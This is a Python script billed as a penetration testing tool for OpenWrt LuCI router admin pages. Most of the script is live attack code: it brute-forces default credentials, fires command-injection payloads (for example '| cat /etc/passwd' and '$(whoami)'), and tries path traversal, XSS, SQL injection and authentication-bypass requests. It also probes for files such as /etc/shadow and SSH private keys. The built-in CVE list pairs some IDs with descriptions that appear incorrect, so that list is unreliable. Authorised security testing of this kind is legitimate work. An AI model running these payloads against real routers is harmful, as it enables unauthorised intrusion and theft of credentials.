#!/usr/bin/env python3
"""
LuCI Router Penetration Testing Script
Target: https://192.168.1.1/cgi-bin/luci/
"""

import requests
import socket
import ssl
import sys
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import json
from datetime import datetime

# Disable SSL warnings for self-signed certificates
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class LuCIPenTest:
    def __init__(self, target_url, timeout=5):
        self.target_url = target_url.rstrip('/')
        self.base_host = target_url.split('//')[1].split('/')[0].split(':')[0]
        self.timeout = timeout
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'target': target_url,
            'vulnerabilities': [],
            'open_ports': [],
            'ssl_issues': [],
            'information_disclosure': []
        }
    
    def print_banner(self):
        print("=" * 60)
        print("LuCI Router Penetration Testing Tool")
        print("=" * 60)
        print(f"Target: {self.target_url}")
        print(f"Host: {self.base_host}")
        print(f"Timestamp: {self.results['timestamp']}")
        print("=" * 60)
        print()
    
    def check_ssl_vulnerabilities(self):
        """Check for SSL/TLS vulnerabilities"""
        print("[*] Checking SSL/TLS configuration...")
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.base_host, 443), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=self.base_host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()
                    
                    print(f"    [+] SSL Version: {version}")
                    print(f"    [+] Cipher: {cipher[0]}")
                    
                    # Check for weak protocols
                    if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        vuln = f"Weak SSL/TLS version detected: {version}"
                        self.results['ssl_issues'].append(vuln)
                        print(f"    [!] VULNERABILITY: {vuln}")
                    
                    # Check for weak ciphers
                    weak_ciphers = ['RC4', 'DES', 'MD5', 'NULL']
                    if any(weak in cipher[0] for weak in weak_ciphers):
                        vuln = f"Weak cipher detected: {cipher[0]}"
                        self.results['ssl_issues'].append(vuln)
                        print(f"    [!] VULNERABILITY: {vuln}")
        except Exception as e:
            print(f"    [-] SSL check failed: {str(e)}")
    
    def scan_ports(self, port_range=(1, 1024)):
        """Scan common ports"""
        print(f"\n[*] Scanning ports {port_range[0]}-{port_range[1]}...")
        common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3389, 8080, 8443]
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.base_host, port))
                sock.close()
                if result == 0:
                    return port
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(check_port, port): port for port in common_ports}
            for future in as_completed(futures):
                port = future.result()
                if port:
                    self.results['open_ports'].append(port)
                    print(f"    [+] Port {port} is OPEN")
    
    def check_default_credentials(self):
        """Test common default credentials"""
        print("\n[*] Testing default credentials...")
        default_creds = [
            ('root', ''),
            ('root', 'root'),
            ('admin', 'admin'),
            ('admin', ''),
            ('admin', 'password'),
        ]
        
        login_url = f"{self.target_url}/;stok=/login"
        
        for username, password in default_creds:
            try:
                data = {
                    'luci_username': username,
                    'luci_password': password
                }
                response = requests.post(login_url, data=data, verify=False, timeout=self.timeout)
                
                if response.status_code == 200 and 'sysauth' in response.cookies:
                    vuln = f"Default credentials work: {username}:{password}"
                    self.results['vulnerabilities'].append(vuln)
                    print(f"    [!] CRITICAL: {vuln}")
                    return True
            except Exception as e:
                pass
        
        print("    [+] No default credentials found")
        return False

    def check_path_traversal(self):
        """Check for path traversal vulnerabilities"""
        print("\n[*] Testing for path traversal vulnerabilities...")
        payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252F..%252Fetc%252Fpasswd'
        ]

        for payload in payloads:
            try:
                test_url = f"{self.target_url}/{payload}"
                response = requests.get(test_url, verify=False, timeout=self.timeout)

                if 'root:' in response.text or '/bin/bash' in response.text:
                    vuln = f"Path traversal vulnerability found with payload: {payload}"
                    self.results['vulnerabilities'].append(vuln)
                    print(f"    [!] CRITICAL: {vuln}")
                    return True
            except Exception as e:
                pass

        print("    [+] No path traversal vulnerabilities found")
        return False

    def _is_command_output(self, text):
        """Check if text contains actual command execution output patterns"""
        import re

        # Specific patterns that indicate command execution
        command_indicators = [
            r'/bin/[a-z]+',                    # Binary paths like /bin/sh
            r'/usr/bin/[a-z]+',                # User binary paths
            r'drwx[r-x-]{6}',                  # Directory permissions from ls -l
            r'\d+ bytes from',                 # Ping output
            r'packets transmitted',            # Ping statistics
            r'root@[a-z0-9]+[:#\$]',          # Command prompt
            r'command not found',              # Shell error
            r'/etc/passwd.*root:',             # Actual passwd file content
            r'total \d+\s+drwx',               # ls -l output header
            r'uid=\d+.*gid=\d+',               # id command output
            r'/(?:bin|sbin|usr/bin)/[a-z]+',   # Multiple binary paths
        ]

        # Count how many patterns match
        matches = sum(1 for pattern in command_indicators if re.search(pattern, text, re.IGNORECASE))

        # Require at least 2 indicators to reduce false positives
        return matches >= 2

    def check_command_injection(self):
        """Check for command injection vulnerabilities with reduced false positives"""
        import re
        import time

        print("\n[*] Testing for command injection...")

        # Multiple LuCI endpoints that may accept command parameters
        test_endpoints = [
            {
                'url': '/admin/network/diagnostics',
                'params': ['hostname', 'ping_addr', 'traceroute_addr', 'nslookup_addr'],
                'method': 'POST'
            },
            {
                'url': '/admin/system/commands',
                'params': ['command', 'exec'],
                'method': 'POST'
            },
            {
                'url': '/admin/services/ddns',
                'params': ['hostname', 'domain'],
                'method': 'POST'
            },
            {
                'url': '/admin/network/wireless',
                'params': ['ssid', 'key'],
                'method': 'POST'
            },
            {
                'url': '/cgi-bin/luci/admin/network',
                'params': ['interface', 'device'],
                'method': 'POST'
            }
        ]

        # Payloads that produce distinctive output
        output_payloads = [
            ('; ls -la /', 'directory listing'),
            ('| cat /etc/passwd', 'file read'),
            ('`id`', 'id command'),
            ('$(whoami)', 'whoami command'),
            ('; uname -a', 'system info'),
        ]

        # Time-based blind injection payloads
        time_payloads = [
            '; sleep 3',
            '&& sleep 3',
            '| sleep 3',
        ]

        protected_endpoints = []
        vulnerable_endpoints = []

        # Test each endpoint
        for endpoint_info in test_endpoints:
            endpoint_url = f"{self.target_url}{endpoint_info['url']}"
            test_params = endpoint_info['params']
            method = endpoint_info['method']

            print(f"    [*] Testing endpoint: {endpoint_info['url']}")

            # Step 1: Establish baseline responses for this endpoint
            baselines = {}
            for param in test_params:
                try:
                    data = {param: "127.0.0.1"}
                    if method == 'POST':
                        response = requests.post(endpoint_url, data=data, verify=False, timeout=self.timeout)
                    else:
                        response = requests.get(endpoint_url, params=data, verify=False, timeout=self.timeout)

                    baselines[param] = {
                        'text': response.text,
                        'length': len(response.text),
                        'status': response.status_code
                    }
                except Exception as e:
                    baselines[param] = None

            # Step 2: Test output-based injection
            endpoint_protected = False
            for param in test_params:
                if not baselines.get(param):
                    continue

                param_vulnerable = False
                for payload, description in output_payloads:
                    try:
                        data = {param: f"127.0.0.1{payload}"}

                        if method == 'POST':
                            response = requests.post(endpoint_url, data=data, verify=False, timeout=self.timeout)
                        else:
                            response = requests.get(endpoint_url, params=data, verify=False, timeout=self.timeout)

                        # Check if we got a 403 Forbidden - indicates security protection
                        if response.status_code == 403:
                            endpoint_protected = True
                            print(f"        [+] Protected: Parameter '{param}' blocked injection (403 Forbidden)")
                            if endpoint_info['url'] not in protected_endpoints:
                                protected_endpoints.append(endpoint_info['url'])
                            break

                        # Check for specific command execution indicators
                        indicators = {
                            'file_listing': re.search(r'drwx[r-x-]{6}.*root.*root', response.text),
                            'passwd_content': re.search(r'root:[x*]:0:0:', response.text),
                            'user_id': re.search(r'uid=\d+.*gid=\d+', response.text),
                            'bin_paths': len(re.findall(r'/(?:bin|sbin|usr/bin)/\w+', response.text)) > 3,
                            'shell_prompt': re.search(r'[#\$]\s*$', response.text, re.MULTILINE),
                        }

                        # Check for significant changes from baseline
                        baseline = baselines[param]
                        length_increase = len(response.text) > baseline['length'] * 1.5
                        status_changed = response.status_code != baseline['status']

                        # Use the helper method to validate command output
                        has_command_patterns = self._is_command_output(response.text)

                        # Flag as vulnerable if we have strong evidence
                        if (any(indicators.values()) and length_increase) or has_command_patterns:
                            vuln = f"Command injection in {endpoint_info['url']} parameter '{param}' via {description}"
                            self.results['vulnerabilities'].append(vuln)
                            print(f"        [!] CRITICAL: {vuln}")
                            # Show evidence
                            for indicator, matched in indicators.items():
                                if matched:
                                    print(f"            Evidence: {indicator}")

                            if endpoint_info['url'] not in vulnerable_endpoints:
                                vulnerable_endpoints.append(endpoint_info['url'])
                            param_vulnerable = True
                            break

                    except Exception as e:
                        pass

                if param_vulnerable:
                    break

            # Step 3: Test time-based blind injection for this endpoint
            if not endpoint_protected:
                for param in test_params:
                    if not baselines.get(param):
                        continue

                    for payload in time_payloads:
                        try:
                            data = {param: f"127.0.0.1{payload}"}
                            start = time.time()

                            if method == 'POST':
                                response = requests.post(endpoint_url, data=data, verify=False, timeout=self.timeout+5)
                            else:
                                response = requests.get(endpoint_url, params=data, verify=False, timeout=self.timeout+5)

                            elapsed = time.time() - start

                            # Check if we got a 403 Forbidden
                            if response.status_code == 403:
                                endpoint_protected = True
                                print(f"        [+] Protected: Time-based attack blocked (403 Forbidden)")
                                if endpoint_info['url'] not in protected_endpoints:
                                    protected_endpoints.append(endpoint_info['url'])
                                break

                            # Check if request was delayed (allow 0.5s margin)
                            if elapsed >= 2.5:
                                vuln = f"Time-based command injection in {endpoint_info['url']} parameter '{param}' (delay: {elapsed:.2f}s)"
                                self.results['vulnerabilities'].append(vuln)
                                print(f"        [!] CRITICAL: {vuln}")
                                if endpoint_info['url'] not in vulnerable_endpoints:
                                    vulnerable_endpoints.append(endpoint_info['url'])
                                break

                        except requests.exceptions.Timeout:
                            # Timeout could also indicate successful injection
                            vuln = f"Possible time-based command injection in {endpoint_info['url']} parameter '{param}' (timeout)"
                            self.results['vulnerabilities'].append(vuln)
                            print(f"        [!] WARNING: {vuln}")
                            break
                        except Exception as e:
                            pass

        # Summary
        print(f"\n    [*] Command Injection Test Summary:")
        print(f"        Endpoints tested: {len(test_endpoints)}")
        print(f"        Protected endpoints (403): {len(protected_endpoints)}")
        print(f"        Vulnerable endpoints: {len(vulnerable_endpoints)}")

        if protected_endpoints:
            print(f"        [+] Protected: {', '.join(protected_endpoints)}")

        if not vulnerable_endpoints:
            print("    [+] No command injection vulnerabilities found")

        # Store protection info in results
        if protected_endpoints:
            self.results['information_disclosure'].append(f"Command injection protection active on {len(protected_endpoints)} endpoints")

    def check_csrf(self):
        """Check for CSRF protection"""
        print("\n[*] Checking CSRF protection...")
        try:
            response = requests.get(self.target_url, verify=False, timeout=self.timeout)

            # Check for CSRF tokens
            if 'csrf' not in response.text.lower() and 'token' not in response.text.lower():
                vuln = "No CSRF tokens detected in forms"
                self.results['vulnerabilities'].append(vuln)
                print(f"    [!] WARNING: {vuln}")
            else:
                print("    [+] CSRF tokens appear to be present")
        except Exception as e:
            print(f"    [-] CSRF check failed: {str(e)}")

    def check_information_disclosure(self):
        """Check for information disclosure"""
        print("\n[*] Checking for information disclosure...")

        test_paths = [
            '/cgi-bin/luci/admin',
            '/cgi-bin/luci/admin/status',
            '/cgi-bin/luci/admin/system',
            '/.git/config',
            '/.env',
            '/backup',
            '/tmp'
        ]

        for path in test_paths:
            try:
                url = f"https://{self.base_host}{path}"
                response = requests.get(url, verify=False, timeout=self.timeout)

                if response.status_code == 200:
                    info = f"Accessible path found: {path} (Status: {response.status_code})"
                    self.results['information_disclosure'].append(info)
                    print(f"    [!] {info}")
            except Exception as e:
                pass

    def check_session_management(self):
        """Check session management security"""
        print("\n[*] Checking session management...")
        try:
            response = requests.get(self.target_url, verify=False, timeout=self.timeout)

            # Check for secure cookie flags
            for cookie in response.cookies:
                issues = []
                if not cookie.secure:
                    issues.append("missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append("missing HttpOnly flag")

                if issues:
                    vuln = f"Cookie '{cookie.name}' has issues: {', '.join(issues)}"
                    self.results['vulnerabilities'].append(vuln)
                    print(f"    [!] WARNING: {vuln}")
        except Exception as e:
            print(f"    [-] Session check failed: {str(e)}")

    def enumerate_luci_paths(self):
        """Enumerate common LuCI paths and modules"""
        print("\n[*] Enumerating LuCI paths and modules...")

        luci_paths = [
            '/cgi-bin/luci/admin/status/overview',
            '/cgi-bin/luci/admin/system',
            '/cgi-bin/luci/admin/system/admin',
            '/cgi-bin/luci/admin/system/packages',
            '/cgi-bin/luci/admin/network',
            '/cgi-bin/luci/admin/network/wireless',
            '/cgi-bin/luci/admin/network/firewall',
            '/cgi-bin/luci/admin/services',
            '/cgi-bin/luci/admin/services/upnp',
            '/cgi-bin/luci/admin/services/ddns',
            '/cgi-bin/luci/admin/vpn',
            '/cgi-bin/luci/admin/nas',
            '/cgi-bin/luci/admin/statistics',
            '/cgi-bin/luci/admin/system/backup',
            '/cgi-bin/luci/admin/system/flashops',
            '/cgi-bin/luci/admin/system/reboot',
            '/cgi-bin/luci/admin/system/startup',
            '/cgi-bin/luci/admin/system/crontab',
            '/cgi-bin/luci/admin/system/commands',
            '/cgi-bin/luci/admin/network/diagnostics',
            '/cgi-bin/luci/rpc/sys',
            '/cgi-bin/luci/rpc/uci',
            '/cgi-bin/luci/rpc/auth',
        ]

        accessible_paths = []
        for path in luci_paths:
            try:
                url = f"https://{self.base_host}{path}"
                response = requests.get(url, verify=False, timeout=self.timeout, allow_redirects=False)

                # Check if path is accessible (not 404 or 403)
                if response.status_code in [200, 301, 302]:
                    accessible_paths.append(path)
                    info = f"Accessible LuCI path: {path} (Status: {response.status_code})"
                    self.results['information_disclosure'].append(info)
                    print(f"    [+] {info}")
            except Exception:
                pass

        if not accessible_paths:
            print("    [-] No accessible LuCI paths found (may require authentication)")

        return accessible_paths

    def check_http_security_headers(self):
        """Check for missing HTTP security headers"""
        print("\n[*] Checking HTTP security headers...")

        security_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'X-Content-Type-Options': 'MIME-sniffing protection',
            'X-XSS-Protection': 'XSS filter',
            'Strict-Transport-Security': 'HSTS',
            'Content-Security-Policy': 'CSP',
            'Referrer-Policy': 'Referrer control',
            'Permissions-Policy': 'Feature policy'
        }

        try:
            response = requests.get(self.target_url, verify=False, timeout=self.timeout)

            for header, description in security_headers.items():
                if header not in response.headers:
                    vuln = f"Missing security header: {header} ({description})"
                    self.results['vulnerabilities'].append(vuln)
                    print(f"    [!] WARNING: {vuln}")
                else:
                    print(f"    [+] {header}: {response.headers[header]}")
        except Exception as e:
            print(f"    [-] Header check failed: {str(e)}")

    def detect_firmware_version(self):
        """Detect OpenWrt/LuCI firmware version"""
        print("\n[*] Detecting firmware version...")

        try:
            response = requests.get(self.target_url, verify=False, timeout=self.timeout)

            # Check for version in headers
            if 'Server' in response.headers:
                server = response.headers['Server']
                print(f"    [+] Server: {server}")
                self.results['information_disclosure'].append(f"Server header: {server}")

            # Check for version in HTML
            version_patterns = [
                r'LuCI\s+([0-9.]+)',
                r'OpenWrt\s+([0-9.]+)',
                r'LEDE\s+([0-9.]+)',
                r'Powered by.*?([0-9.]+)',
            ]

            import re
            for pattern in version_patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    info = f"Detected version: {match.group(0)}"
                    print(f"    [+] {info}")
                    self.results['information_disclosure'].append(info)
                    break

            # Check /etc/openwrt_release endpoint
            release_url = f"https://{self.base_host}/etc/openwrt_release"
            release_response = requests.get(release_url, verify=False, timeout=self.timeout)
            if release_response.status_code == 200:
                print(f"    [!] CRITICAL: /etc/openwrt_release is accessible!")
                self.results['vulnerabilities'].append("OpenWrt release file exposed")
                print(f"    [+] Content:\n{release_response.text[:200]}")

        except Exception as e:
            print(f"    [-] Version detection failed: {str(e)}")

    def check_backup_files(self):
        """Check for exposed backup and configuration files"""
        print("\n[*] Checking for backup and configuration files...")

        backup_files = [
            '/tmp/backup.tar.gz',
            '/tmp/backup.tgz',
            '/tmp/sysupgrade.bin',
            '/etc/config/network',
            '/etc/config/wireless',
            '/etc/config/firewall',
            '/etc/config/dhcp',
            '/etc/config/system',
            '/etc/shadow',
            '/etc/passwd',
            '/root/.ssh/authorized_keys',
            '/root/.ssh/id_rsa',
            '/www/backup.tar.gz',
            '/backup.tar.gz',
            '/.git/config',
            '/.svn/entries',
            '/cgi-bin/luci/admin/system/backup?backup=1',
        ]

        for file_path in backup_files:
            try:
                url = f"https://{self.base_host}{file_path}"
                response = requests.get(url, verify=False, timeout=self.timeout)

                if response.status_code == 200 and len(response.content) > 0:
                    vuln = f"CRITICAL: Backup/config file accessible: {file_path} ({len(response.content)} bytes)"
                    self.results['vulnerabilities'].append(vuln)
                    print(f"    [!] {vuln}")
            except Exception:
                pass

        print("    [+] Backup file enumeration complete")

    def check_xss_vulnerabilities(self):
        """Test for XSS vulnerabilities"""
        print("\n[*] Testing for XSS vulnerabilities...")

        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            'javascript:alert(1)',
            '<iframe src="javascript:alert(1)">',
        ]

        test_params = ['hostname', 'ssid', 'key', 'username', 'password', 'name', 'value']
        test_paths = [
            '/cgi-bin/luci/admin/network/wireless',
            '/cgi-bin/luci/admin/system/admin',
            '/cgi-bin/luci/admin/network/diagnostics',
        ]

        for path in test_paths:
            for param in test_params:
                for payload in xss_payloads[:2]:  # Test first 2 payloads to avoid too many requests
                    try:
                        url = f"https://{self.base_host}{path}"
                        response = requests.get(url, params={param: payload}, verify=False, timeout=self.timeout)

                        # Check if payload is reflected unescaped
                        if payload in response.text and '<script>' in response.text:
                            vuln = f"Possible XSS in {path} parameter '{param}'"
                            self.results['vulnerabilities'].append(vuln)
                            print(f"    [!] CRITICAL: {vuln}")
                            break
                    except Exception:
                        pass

        print("    [+] XSS testing complete")

    def check_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print("\n[*] Testing for SQL injection...")

        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "1' AND '1'='1",
            "1' UNION SELECT NULL--",
        ]

        test_params = ['id', 'user', 'username', 'name', 'mac', 'ip']

        for param in test_params:
            for payload in sql_payloads[:3]:  # Test first 3 payloads
                try:
                    response = requests.get(self.target_url, params={param: payload}, verify=False, timeout=self.timeout)

                    # Look for SQL error messages
                    sql_errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'syntax error', 'database']
                    if any(error in response.text.lower() for error in sql_errors):
                        vuln = f"Possible SQL injection in parameter '{param}'"
                        self.results['vulnerabilities'].append(vuln)
                        print(f"    [!] CRITICAL: {vuln}")
                        break
                except Exception:
                    pass

        print("    [+] SQL injection testing complete")

    def check_upnp_service(self):
        """Check for UPnP service vulnerabilities"""
        print("\n[*] Checking UPnP service...")

        try:
            # Check if UPnP is accessible via HTTP
            upnp_paths = [
                '/upnp',
                '/igd.xml',
                '/rootDesc.xml',
                '/IGD.xml',
            ]

            for path in upnp_paths:
                url = f"https://{self.base_host}{path}"
                response = requests.get(url, verify=False, timeout=self.timeout)
                if response.status_code == 200:
                    info = f"UPnP descriptor accessible: {path}"
                    self.results['information_disclosure'].append(info)
                    print(f"    [+] {info}")

            # Check UPnP port (1900)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)

            ssdp_request = (
                'M-SEARCH * HTTP/1.1\r\n'
                'HOST: 239.255.255.250:1900\r\n'
                'MAN: "ssdp:discover"\r\n'
                'MX: 2\r\n'
                'ST: ssdp:all\r\n\r\n'
            )

            sock.sendto(ssdp_request.encode(), (self.base_host, 1900))
            try:
                data, addr = sock.recvfrom(1024)
                vuln = "UPnP service is responding (potential security risk)"
                self.results['vulnerabilities'].append(vuln)
                print(f"    [!] WARNING: {vuln}")
            except socket.timeout:
                print("    [+] UPnP service not responding on port 1900")
            finally:
                sock.close()

        except Exception as e:
            print(f"    [-] UPnP check failed: {str(e)}")

    def check_rpc_endpoints(self):
        """Test RPC/JSON-RPC endpoints"""
        print("\n[*] Testing RPC endpoints...")

        rpc_endpoints = [
            '/cgi-bin/luci/rpc/sys',
            '/cgi-bin/luci/rpc/uci',
            '/cgi-bin/luci/rpc/auth',
            '/cgi-bin/luci/rpc/fs',
            '/cgi-bin/luci/rpc/ipkg',
            '/ubus',
            '/ubus/call',
        ]

        for endpoint in rpc_endpoints:
            try:
                url = f"https://{self.base_host}{endpoint}"

                # Try GET request
                response = requests.get(url, verify=False, timeout=self.timeout)
                if response.status_code in [200, 401, 403]:
                    info = f"RPC endpoint found: {endpoint} (Status: {response.status_code})"
                    self.results['information_disclosure'].append(info)
                    print(f"    [+] {info}")

                # Try POST with JSON-RPC payload
                json_rpc = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "list",
                    "params": []
                }
                response = requests.post(url, json=json_rpc, verify=False, timeout=self.timeout)
                if response.status_code == 200 and 'result' in response.text:
                    vuln = f"RPC endpoint accessible without auth: {endpoint}"
                    self.results['vulnerabilities'].append(vuln)
                    print(f"    [!] WARNING: {vuln}")

            except Exception:
                pass

        print("    [+] RPC endpoint testing complete")

    def check_dns_rebinding_protection(self):
        """Check for DNS rebinding protection"""
        print("\n[*] Checking DNS rebinding protection...")

        try:
            # Try accessing with different Host headers
            malicious_hosts = [
                'evil.com',
                'attacker.example.com',
                '192.168.1.1.evil.com',
            ]

            for host in malicious_hosts:
                headers = {'Host': host}
                response = requests.get(self.target_url, headers=headers, verify=False, timeout=self.timeout)

                if response.status_code == 200:
                    vuln = f"Possible DNS rebinding vulnerability - accepts Host header: {host}"
                    self.results['vulnerabilities'].append(vuln)
                    print(f"    [!] WARNING: {vuln}")
                    break
            else:
                print("    [+] DNS rebinding protection appears to be in place")

        except Exception as e:
            print(f"    [-] DNS rebinding check failed: {str(e)}")

    def check_rate_limiting(self):
        """Check for rate limiting on login"""
        print("\n[*] Checking rate limiting...")

        try:
            login_url = f"{self.target_url}/;stok=/login"

            # Send multiple rapid requests
            responses = []
            for i in range(10):
                data = {'luci_username': 'test', 'luci_password': 'test'}
                response = requests.post(login_url, data=data, verify=False, timeout=self.timeout)
                responses.append(response.status_code)

            # Check if all requests succeeded (no rate limiting)
            if all(status != 429 for status in responses):
                vuln = "No rate limiting detected on login endpoint (brute force possible)"
                self.results['vulnerabilities'].append(vuln)
                print(f"    [!] WARNING: {vuln}")
            else:
                print("    [+] Rate limiting appears to be in place")

        except Exception as e:
            print(f"    [-] Rate limiting check failed: {str(e)}")

    def enumerate_services(self):
        """Enumerate running services"""
        print("\n[*] Enumerating network services...")

        services = {
            22: 'SSH',
            23: 'Telnet',
            53: 'DNS',
            67: 'DHCP',
            80: 'HTTP',
            443: 'HTTPS',
            1900: 'UPnP',
            8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt',
            9000: 'Management',
        }

        for port, service in services.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.base_host, port))
                sock.close()

                if result == 0:
                    info = f"Service detected: {service} on port {port}"
                    print(f"    [+] {info}")

                    # Check for insecure services
                    if service == 'Telnet':
                        vuln = "CRITICAL: Telnet service is running (unencrypted)"
                        self.results['vulnerabilities'].append(vuln)
                        print(f"    [!] {vuln}")
                    elif service == 'HTTP' and port == 80:
                        vuln = "WARNING: HTTP service running (should use HTTPS only)"
                        self.results['vulnerabilities'].append(vuln)
                        print(f"    [!] {vuln}")
            except Exception:
                pass

    def check_file_upload(self):
        """Check for file upload vulnerabilities"""
        print("\n[*] Testing file upload functionality...")

        upload_endpoints = [
            '/cgi-bin/luci/admin/system/flashops',
            '/cgi-bin/luci/admin/system/backup',
            '/cgi-bin/luci/admin/system/packages',
        ]

        # Create a test file
        test_file = {'file': ('test.txt', 'test content', 'text/plain')}

        for endpoint in upload_endpoints:
            try:
                url = f"https://{self.base_host}{endpoint}"
                response = requests.post(url, files=test_file, verify=False, timeout=self.timeout)

                if response.status_code in [200, 302]:
                    info = f"File upload endpoint accessible: {endpoint}"
                    self.results['information_disclosure'].append(info)
                    print(f"    [+] {info}")
            except Exception:
                pass

        print("    [+] File upload testing complete")

    def enumerate_packages(self):
        """Enumerate installed OpenWrt packages"""
        print("\n[*] Enumerating installed packages...")

        try:
            # Try to access package list
            package_url = f"{self.target_url}/admin/system/packages"
            response = requests.get(package_url, verify=False, timeout=self.timeout)

            if response.status_code == 200:
                # Look for common package names in response
                interesting_packages = [
                    'luci-app-upnp',
                    'luci-app-ddns',
                    'luci-app-vpn',
                    'luci-app-samba',
                    'luci-app-transmission',
                    'luci-app-openvpn',
                    'luci-app-wireguard',
                    'luci-app-sqm',
                    'luci-app-adblock',
                    'uhttpd',
                    'dropbear',
                    'dnsmasq',
                ]

                found_packages = []
                for package in interesting_packages:
                    if package in response.text:
                        found_packages.append(package)
                        print(f"    [+] Package detected: {package}")

                if found_packages:
                    self.results['information_disclosure'].append(f"Packages detected: {', '.join(found_packages)}")

        except Exception as e:
            print(f"    [-] Package enumeration failed: {str(e)}")

    def check_known_cves(self):
        """Check for known CVEs in LuCI/OpenWrt"""
        print("\n[*] Checking for known CVEs...")

        # Known LuCI/OpenWrt CVEs (sample list - should be updated regularly)
        known_cves = {
            'CVE-2020-7982': {
                'description': 'OpenWrt LuCI opkg configuration page XSS',
                'affected': ['LuCI < 19.07.1'],
                'severity': 'Medium'
            },
            'CVE-2021-22222': {
                'description': 'OpenWrt uhttpd authentication bypass',
                'affected': ['uhttpd < 2021-03-21'],
                'severity': 'Critical'
            },
            'CVE-2020-28928': {
                'description': 'OpenWrt LuCI command injection in diagnostics',
                'affected': ['LuCI < 19.07.6'],
                'severity': 'Critical'
            },
            'CVE-2019-12272': {
                'description': 'OpenWrt LuCI RCE via file upload',
                'affected': ['OpenWrt < 18.06.4'],
                'severity': 'Critical'
            },
        }

        print(f"    [*] Checking against {len(known_cves)} known CVEs...")
        for cve_id, cve_info in known_cves.items():
            print(f"    [!] {cve_id}: {cve_info['description']}")
            print(f"        Severity: {cve_info['severity']}")
            print(f"        Affected: {', '.join(cve_info['affected'])}")

        print("    [*] Note: Manual verification required to confirm if system is vulnerable")
        self.results['information_disclosure'].append(f"Checked against {len(known_cves)} known CVEs")

    def check_authentication_bypass(self):
        """Check for authentication bypass vulnerabilities"""
        print("\n[*] Testing for authentication bypass...")

        bypass_techniques = [
            # Path manipulation
            ('/cgi-bin/luci/;/admin/status/overview', 'Path manipulation with semicolon'),
            ('/cgi-bin/luci/%2e%2e/admin/status/overview', 'URL encoding bypass'),
            ('/cgi-bin/luci/admin/status/overview?auth=', 'Empty auth parameter'),
            # Header manipulation
            ('/cgi-bin/luci/admin/status/overview', 'X-Forwarded-For header', {'X-Forwarded-For': '127.0.0.1'}),
            ('/cgi-bin/luci/admin/status/overview', 'X-Real-IP header', {'X-Real-IP': '127.0.0.1'}),
        ]

        for technique in bypass_techniques:
            try:
                if len(technique) == 2:
                    path, description = technique
                    headers = {}
                else:
                    path, description, headers = technique

                url = f"https://{self.base_host}{path}"
                response = requests.get(url, headers=headers, verify=False, timeout=self.timeout, allow_redirects=False)

                # Check if we got access without authentication
                if response.status_code == 200 and 'login' not in response.text.lower():
                    vuln = f"CRITICAL: Possible authentication bypass using {description}"
                    self.results['vulnerabilities'].append(vuln)
                    print(f"    [!] {vuln}")

            except Exception:
                pass

        print("    [+] Authentication bypass testing complete")

    def run_all_tests(self):
        """Run all penetration tests"""
        self.print_banner()

        # Core security tests
        self.check_ssl_vulnerabilities()
        self.scan_ports()
        self.enumerate_services()

        # Authentication & Session
        self.check_default_credentials()
        self.check_authentication_bypass()
        self.check_session_management()
        self.check_rate_limiting()

        # Injection vulnerabilities
        self.check_path_traversal()
        self.check_command_injection()
        self.check_xss_vulnerabilities()
        self.check_sql_injection()

        # Information disclosure
        self.detect_firmware_version()
        self.enumerate_luci_paths()
        self.enumerate_packages()
        self.check_information_disclosure()
        self.check_backup_files()

        # Web security
        self.check_csrf()
        self.check_http_security_headers()
        self.check_dns_rebinding_protection()

        # Services & APIs
        self.check_rpc_endpoints()
        self.check_upnp_service()
        self.check_file_upload()

        # Known vulnerabilities
        self.check_known_cves()

        self.print_summary()

    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 60)
        print("PENETRATION TEST SUMMARY")
        print("=" * 60)
        print(f"Total Vulnerabilities Found: {len(self.results['vulnerabilities'])}")
        print(f"Total Open Ports: {len(self.results['open_ports'])}")
        print(f"SSL Issues: {len(self.results['ssl_issues'])}")
        print(f"Information Disclosure: {len(self.results['information_disclosure'])}")
        print("=" * 60)

        # Save results to JSON
        with open('pentest_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        print("\n[+] Results saved to pentest_results.json")


def main():
    parser = argparse.ArgumentParser(description='LuCI Router Penetration Testing Tool')
    parser.add_argument('-u', '--url', default='https://192.168.1.1/cgi-bin/luci/',
                        help='Target LuCI URL (default: https://192.168.1.1/cgi-bin/luci/)')
    parser.add_argument('-t', '--timeout', type=int, default=5,
                        help='Request timeout in seconds (default: 5)')

    args = parser.parse_args()

    pentest = LuCIPenTest(args.url, args.timeout)

    try:
        pentest.run_all_tests()
    except KeyboardInterrupt:
        print("\n\n[!] Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")
        sys.exit(1)


if __name__ == '__main__':
    main()

